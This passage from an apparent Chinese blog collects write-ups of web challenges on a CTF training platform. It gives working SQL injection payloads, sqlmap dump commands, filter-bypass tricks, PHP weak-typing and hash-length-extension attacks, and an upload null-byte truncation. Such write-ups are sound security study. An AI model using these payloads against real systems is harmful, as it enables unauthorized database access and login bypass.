href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” -C “password” –dump –level 5<br>回显</p><p>Database: test<br>Table: admin<br>[1 entry]<br>+———-+<br>| password |<br>+———-+<br>| idnuenna |<br>+———-+<br>直接登录即可获得flag，</p><p>账号 admin 密码 idnuenna<br>获得key</p><p>恭喜你密码正确！ KEY :!@#WwwN5f0cu5coM</p><h3 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h3><p>Content-Row:响应头内容<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181759_121.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181800_592.png" alt=""></p><h3 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h3><p><a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="external">http://ctf5.shiyanbar.com/sHeader/</a><br>进入之后给了提示,需要满足三个条件</p><ol><li>安装 .NET 9.9</li><li>使用IE浏览器访问</li><li>要在英国<br>根据提示和题目名称呢，可以判断要修改http头</li></ol><p>于是乎构造</p><p>User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/5.0) .NET CLR 9.9<br>Accept-Language: en-gb;</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181805_551.png" alt=""></p><h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db –tables<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181824_480.png" alt=""><br>sqlmap.py -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey –columns<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181824_242.png" alt=""></p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey -C k0y –dump<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181825_659.png" alt=""><br> 爆字段得到key：whatiMyD91dump</p><p>方法二：<br>输入id=1 and 1=1 显示正常<br>输入id=1 and 1=2 回显错误<br>判断存在SQL注入漏洞（恩）<br>然后判断字段数<br>id=1 order by 1 可以，id=1 order by 2 可以，id=1 order by 3 不行！<br>所以字段数位2<br>id=1 union select 1 错误，id=1 union select 1,2 可以<br>所以字段数位2<br>然后开始爆数据库<br>id=1 union select 1,schema_name from information_schema.schemata</p><p>我们看到爆出了三个库：information_schema、my_db、test</p><p>接下来就是爆my_db的表名(就这个库名比较特别，就它了)<br>id=1 union select 1,table_name from information_schema.tables where table_schema=’my_db’</p><p>在my_db库里面爆出了两个表：news、thiskey<br>对了，thiskey在这里，然后就尝试爆列名</p><p>id=1 union select 1,column_name from information_schema.columns where table_schema=’my_db’</p><p>应该就是k0y了，试试看</p><p>id=1 union select 1,k0y from thiskey</p><h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><pre><code>&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) {  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();}$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;){  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;}?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website?</code></pre><p>要将hackerDJ进行两次url编码才可满足两个条件</p><p>hackerDJ</p><p>%68%61%63%6B%65%72%44%4A</p><p>%2568%2561%2563%256B%2565%2572%2544%254A<br>提交即可获得flag</p><p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A" target="_blank" rel="external">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</a><br>回显<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181831_78.png" alt=""></p><p>flag: DUTCTF{PHP_is_the_best_program_language}</p><h3 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h3><p>直接复制到浏览器的console运行即可<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181833_337.png" alt=""></p><h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><pre><code>//$_POST[user]意思是读取用户在提交表单时输入的user值，$_POST[PASS]同理//如果二者的值都不为空if($_POST[user] &amp;&amp; $_POST[pass]) {    //连接数据库    $conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);    //选择数据库，如果出错，打印错误信息并终止代码运行    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) {        die(&quot;Connection failed: &quot; . mysql_error($conn));} //将用户输入的user值存储到user变量$user = $_POST[user];//将用户输入的pass值，使用md5 hash后，存入pass变量$pass = md5($_POST[pass]);//从表php中查找pw的值//后半句的意思是：只保留user值为$user那一行的查找结果 $sql = &quot;select pw from php where user=&#39;$user&#39;&quot;;//查询语句的运行结果存入变量query之中$query = mysql_query($sql);//如果找不到，报错并终止if (!$query) {    printf(&quot;Error: %s\n&quot;, mysql_error($conn));    exit();}//提取出query的值并以MYSQL_ASSOC格式存放在row之中$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;];//如果row[pw]的值存在，且pass的值与row[pw]相同，则返回key//strcasecmp是比较两个值大小，返回：-1,0,1  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;}//否则返回登录失败else {    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);  }}</code></pre><p>这里pass的值是 用户提交的密码经过MD5hash之后的值 如果二者相同则拿到 key</p><p>找输入输出</p><p>user一项的输出在php代码中如下： $sql = “select pw from php where user=’$user’”; 看起来并未对输入进行过滤，我们试着打入引号，果然报错，证明注入点可用！</p><p>分析</p><p>此时用工具打表的话，意义不大，因为此题目标已经明晰，我们只要让row[pw]的值与pass经过md5之后的值相等即可。 而$pass经过md5之后的值是我们可以通过正常输入控制的。 同时，row[pw]的值是从$sql提取出来的 因此，目标就一句话：只要我们能够修改$sql的值，此题解决。 再次审视注入点：$sql = “select pw from php where user=’$user’”; 在这里我们可以利用sql语句，直接给$sql返回一个值。 也就是说，不需要访问题里的数据库，只要我们修改了$sql的值，此题解决.</p><p>构造</p><p>最终user的框里输入的内容为： ‘AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #</p><p>最前面的单引号：闭合原文的where user=’<br>AND 0=1:为了使前面的表达式返回值为空 从而使select pw from php where user=’’ AND 0=1这句话完全没用<br>接着我们使用UNION SELECT “c4ca4238a0b923820dcc509a6f75849b”，直接把MD5值作为返回值retuen给$sql<br>c4ca4238a0b923820dcc509a6f75849b这串MD5值是数字1经过MD5 hash之后的结果<br>最后的#用来注释掉后面没用的东西<br>最终，将’AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #输入到user框里，将数字1输入到pass框里，登录成功。<br>或者user=’and 1=0 union select md5(1) #&amp;pass=1<br>key：SimCTF{youhaocongming}<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803192336_939.png" alt=""></p><h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803192339_352.png" alt=""></p><p>方法一：</p><pre><code>&lt;?php      $_code = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;      $_code = str_rot13($_code);      $_code = strrev($_code);      $_code = base64_decode($_code);      //echo $_code;      $_ans = &quot;&quot;;      for($x = 0; $x &lt; strlen($_code); $x++) {          $t = substr($_code, $x, 1);          $t1 = ord($t) - 1;          $t = chr($t1);          $_ans = $_ans . $t;      }      $_ans = strrev($_ans);      echo $_ans;  ?&gt;</code></pre><p>方法二：</p><pre><code>&lt;?php$str=&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;;$_out=&#39;&#39;;$_in= base64_decode (strrev(str_rot13 ($str)));        for($_start=0;$_start&lt;strlen($_in);$_start++){                $_c=substr($_in,$_start,1);                $__=ord($_c)-1;                $_c=chr($__);                $_out=$_out.$_c;        }    echo strrev($_out);?&gt;</code></pre><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200102_440.png" alt=""><br>burp抓包，修改为 uploads/1.php .jpg<br>转到hex编码，将空格20，改为00<br>00截断<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200104_758.png" alt=""></p><h3 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h3><p>PHP代码审计<br>hint：sha1函数你有认真了解过吗？听说也有人用md5碰撞o(╯□╰)o<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/false.php</a> </p><pre><code>&lt;?phpif (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))      die(&#39;Flag: &#39;.$flag);    else        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;}else{    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;?&gt;</code></pre><p>get获得参数name和passowrd，要获得flag，就要让两个参数不相等，但是两个参数的sha1()相等。<br>此处考察了一个知识点，MD5，sha1等hash函数在对数组进行加密的时候会返回FALSE，<br>这里可以运用数组绕过，sha1的参数必须为字符串，如果为其他的类型，则会直接返回FLASE，让两个参数都为数组的形式，就可以FALSE===FALSE，输出flag。当我们传入name[]=1&amp;password[]=2时，会造成<code>sha1(Array) === sha1(Array)</code>，即<code>NULL===NULL</code>，从而吐出flag</p><p>?name[]=1&amp;password[]=2<br>Flag: CTF{t3st_th3_Sha1}</p><h3 id="Guess-Next"><a href="#Guess-Next" class="headerlink" title="Guess Next"></a>Guess Next</h3><p>写个算法没准就算出来了，23333<br>hint：你确定你有认真看判断条件？</p><p>解题链接： <a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/Session.php</a>  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200117_574.png" alt=""><br>burpsuite抓包，将phpsessid置空，并get参数password为空就行。。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200118_840.png" alt=""><br> CTF{Cl3ar_th3_S3ss1on}</p><h3 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h3><p>啊拉？又是php审计。已经想吐了。<br>hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/more.php</a> </p><pre><code>&lt;?phpif (isset ($_GET[&#39;password&#39;])) {    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)    {        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;    }    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)    {        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)        {            die(&#39;Flag: &#39; . $flag);        }        else        {            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);        }    }    else    {        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;    }}?&gt;</code></pre><p>1.ereg漏洞：首先第一层检查需要绕过ereg漏洞，百度可以知道存在截断的问题，ereg读到%00的时候，就截止了</p><p>2.strlen()限制了长度小于8并且大小必须大于9999999,1e8=100000000 &gt; 9999999</p><p>3.strpos()对password进行匹配，必须含有-，最终才输出flag</p><p>于是构造?password=1e9%00<em>-</em></p><p>Flag: CTF{Ch3ck_anD_Ch3ck}</p><blockquote><p><a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="external">http://blog.csdn.net/qq_31481187/article/details/60968595</a></p></blockquote><h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>找回密码<br>格式：SimCTF{ }<br>解题链接： <a href="http://ctf5.shiyanbar.com/10/upload/" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/upload/</a> </p><p>进入网站step1.php，查看源代码，发现一句<meta name="editor" content="Vim"></p><p>vim编辑，可能存在.xxxx.php.swp的备份文件。尝试了.step1.php.swp、.step2.php.swp，都是404，查看step2.php的源码，发现有一个Submit.php，直接访问，提示you are not an admin，访问.submit.php.swp，果然存在，源码如下</p><pre><code>if(!empty($token)&amp;&amp;!empty($emailAddress)){    if(strlen($token)!=10) die(&#39;fail&#39;);    if($token!=&#39;0&#39;) die(&#39;fail&#39;);    $sql = &quot;SELECT count(*) as num from `user` where token=&#39;$token&#39; AND email=&#39;$emailAddress&#39;&quot;;    $r = mysql_query($sql) or die(&#39;db error&#39;);    $r = mysql_fetch_assoc($r);    $r = $r[&#39;num&#39;];    if($r&gt;0){        echo $flag;    }else{        echo &quot;you are not an admin&quot;;    }}</code></pre><p>邮箱为admin的邮箱，要求token长度为10，且token需要等于零。</p><p>邮箱在step1.php中有提到<meta name="admin" content="admin@simplexue.com"></p><p>token验证可以用php中的0exxxxxxxx绕过。</p><p>payload：?emailAddress=admin@simplexue.com&amp;token=0e11111111</p><p>flag：SimCTF{huachuan_TdsWX}</p><h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200134_866.png" alt=""><br>让username的MD5和0相等，可以让MD5以0e开头。<br><a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">PHP处理0e开头md5哈希字符串缺陷/bug</a></p><p>username输入QNKCDZO，得到/user.php?fame=hjkleffifer，访问页面看到一段php源码。</p><pre><code>$unserialize_str = $_POST[&#39;password&#39;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]==&#39;???&#39;) {    print_r($flag); }</code></pre><p>这段php将post的password值进行了反序列化，得到了一个数组，将数组的user和pass的值和???进行了比较。比较用到了php的弱类型，bool类型的true跟任意字符串可以弱类型相等<br>因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度）<br>payload:post：a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;}</p><p>flag:ctf{dwduwkhduw5465}</p><h3 id="Forms-1"><a href="#Forms-1" class="headerlink" title="Forms"></a>Forms</h3><p>查看网页源代码。</p><pre><code>&lt;input type=&quot;hidden&quot; name=&quot;showsource&quot; value=0&gt;</code></pre><p>将type中的hidden去掉，并赋值value=1，提交，就能看到源代码了。</p><pre><code>$a = $_POST[&quot;PIN&quot;];if ($a == -19827747736161128312837161661727773716166727272616149001823847) {    echo &quot;Congratulations! The flag is $flag&quot;;} else {    echo &quot;User with provided PIN not found.&quot;; }</code></pre><p>让a等于对应的数字，就能得到flag。</p><p>flag：ctf{forms_are_easy}</p><h3 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h3><p>题目的意思就是通过改变地址栏访问index.php，但是限制了条件不能使用 ./  ../ \ 而且只能使用小写字母，不可以在php后加点，这里我们可以利用伪静态技术，使用<a href="http://ctf5.shiyanbar.com/indirection/index.php/index.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/indirection/index.php/index.php</a><br>index.php后的index.php会被当做参数处理，所以服务器只会解析第一个index.php，满足条件成功绕过。</p><p>URL重写，其实就是把带一大堆参数的url，变成一个看上去很规矩的url,主要目的是为了搜索引擎。</p><h3 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h3><p>先用burpsuite抓包，发现setcookie中有source=0，在cookie中赋值，将其改为1，得到源代码。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201255_194.png" alt=""></p><pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) {    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {            echo &quot;Congratulations! You are a registered user.\n&quot;;            die (&quot;The flag is &quot;. $flag);        }        else {            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);        }    }    else {        die (&quot;You are not an admin! LEAVE.&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    if ($_COOKIE[&quot;source&quot;] != 0) {        echo &quot;&quot;; // This source code is outputted here    }}</code></pre><p>samlpe-hash是15位的secret+adminadmin的md5值，要获得flag，要让cookie中的getmein值等于secret+username+password的md5值，password又不能等于admin，所以要利用哈希扩展攻击，这里直接用的hashpump工具。</p><pre><code>hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a admin</code></pre><p>输出结果</p><pre><code>e18dfd8404515016d3aeeea2aa196909admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin</code></pre><p>将\x换成%并填入对应位置。<br>hash2</p><p>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p><p>打开网页，查看源代码，获得提示<!-- please post what you find with parameter:key -->，让我们post参数key。</p><p>抓包发现header头中有经过base64编码的flag参数，<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200157_179.png" alt=""><br>将参数解码P0ST_THIS_T0_CH4NGE_FL4G:9x3PyMMd9，将参数9x3PyMMd9post却没有结果，题目中说尽快的提交，猜测与时间有关，用python脚本解</p><pre><code>import requests,refrom base64 import b64decodes = requests.Session()url = &#39;http://ctf5.shiyanbar.com/web/10/10.php&#39;r = s.get(url)head = r.headersflag = b64decode(head[&#39;flag&#39;]).split(&#39;:&#39;)[1]r1 = s.post(url, data={&#39;key&#39;:flag})print r1.text</code></pre><h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>1.判断<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201346_982.png" alt=""><br>2.判断过滤<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1 and 1=1<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201347_373.png" alt=""></p><blockquote><p>过滤空格方法</p><ol><li>注释/<strong>/绕过空格     select user() from d     变成`select/</strong>/user()/<strong>/from/</strong>/`</li><li>括号绕过空格     select user() from dual where 1=1 and 2=2     变成     select(user())from dual where(1=1)and(2=2)</li><li>使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a</li></ol></blockquote><pre><code>对页面输入下面的测试项测试过滤规则测试项    输入    是否过滤逗号    ,&#39;    否注释符#    #&#39;    是注释符 --    --&#39;    是注释符/**/    /**/&#39;    否updatexml函数    updatexml &#39;    否select    select&#39;    否select    select &#39;    是select    select/**/&#39;    否select    /*!select*/    否or    or&#39;    否and    and&#39;    否concat    concat &#39;    否group_concat    group_concat&#39;    是group_concat    /*groupt_concat*/&#39;    是group_concat    groupgroup_concat_concat&#39;    否</code></pre><p>3.判断有那些数据库：</p><pre><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/&#39;1&#39;=&#39;1</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201407_844.png" alt=""></p><ol><li>查看有哪些数据表：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/<strong>/‘1’=’1<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201415_889.png" alt=""><br> 发现了flag的表，我们猜测应该是在web1数据库中并且字段就是flag（其实就在本页面的数据库中）<br>故：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/</strong>/union/<strong>/select/</strong>/flag/<strong>/from/</strong>/web1.flag/<strong>/where/</strong>/‘1’=’1<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201419_771.png" alt=""><br>方法二：<br>双空格双查询<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere ‘1’=’1</li></ol><p>###简单的sql注入之2<br>用?id=1 and 1=1测试，返回SQLi detected!，这是过滤了and？又尝试了很多关键字，都返回SQLi detected!，那可能是过滤了空格。<br>绕过空格<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201422_573.png" alt=""><br>payload</p><pre><code>http://ctf5.shiyanbar.com/web/index_2.php/?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201437_337.png" alt=""></p><h3 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h3><p>注库名</p><pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=1&quot; --dbs</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201444_689.png" alt=""></p><p>当前数据库<br>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php/?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php/?id=1</a>“ –current-db</p><p>注表名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” –tables<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201453_629.png" alt=""></p><p>注字段<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” -T “flag” –columns<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201457_156.png" alt=""><br>注内容<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=123" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=123</a>“ -D “web1” -T “flag” -C “flag” –dump<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201517_635.png" alt=""></p><p>flag{Y0u_@r3_5O_dAmn_90Od}</p><h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p><a href="http://ctf5.shiyanbar.com/web/pcat/source.txt" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/pcat/source.txt</a></p><pre><code>&lt;?phperror_reporting(0);if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {  echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;  echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;    die;}function AttackFilter($StrKey,$StrValue,$ArrReq){      if (is_array($StrValue)){        $StrValue=implode($StrValue);    }    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){           print &quot;水可载舟，亦可赛艇！&quot;;        exit();    }}$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;foreach($_POST as $key=&gt;$value){     AttackFilter($key,$value,$filter);}$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con){  die(&#39;Could not connect: &#39; . mysql_error());}$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);$sql=&quot;SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) {     $key = mysql_fetch_array($query);    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {        print &quot;CTF{XXXXXX}&quot;;    }else{        print &quot;亦可赛艇！&quot;;    }}else{  print &quot;一颗赛艇！&quot;;}mysql_close($con);?&gt;</code></pre><p>注意过滤了这些关键字</p><pre><code>$filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)“;</code></pre><p>要输出flag就要满足<code>mysql_num_rows($query) == 1、$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>这两个条件。</p><p>mysql_num_rows()函数返回结果集中行的数目。我们构造uname让sql语句查询出来的结果是一行就能绕过。Uname = ‘or 1 limit 1#，这样sql语句就是SELECT * FROM interest WHERE uname = ‘’or 1 limit 1#，这样就查询1行，也就能绕过第一个条件。<br>从源码分析可得，过滤了逗号，我们不能简单的使用limit 1,1这样的语法，而是可以使用limit 1 offset 1。</p><p>第二个条件是让查询的pwd的值等于输入的值，此处用的是 ==，根据弱类型，NULL和空字符串是相等的，然后就是绕过pwd了，<br>这里的思路是，利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的</p><p>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #<br>这里解释一下此时执行的SQL:<br>SELECT * FROM interest where uname=’ ‘ or 1=1<br>group by pwd with rollup （在数据库中添加一行使得pwd=NULL）<br>limit 1 （只查询一行）<br>offset 2 （从第二行开始查询）#注释<br>此时密码只要为空即可查询成功</p><p>payload:uname=’or 1 group by pwd with rollup limit 1 OFFSET 2#</p><p>flag：CTF{with_rollup_interesting}</p><h3 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h3><p>自己没做出来<br>别人的wp三种方法：<br><a href="https://www.jianshu.com/p/5d34b3722128" target="_blank" rel="external">https://www.jianshu.com/p/5d34b3722128</a></p><h3 id="登录一下好吗？？"><a href="#登录一下好吗？？" class="headerlink" title="登录一下好吗？？"></a>登录一下好吗？？</h3><p>题目地址: <a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a></p><p>在用户名表单里提交一系列字段可以发现题目过滤了几乎所有查询语句，注释，但是没有过滤’，这里的绕过比较巧妙，由于=是从左到到运算的，所以可以人为构造0=0的结果，payload为username=1’=’&amp;password=1’=’，拼接后的语句为:</p><pre><code>select * from user where username=&#39;1&#39;=&#39;&#39; and 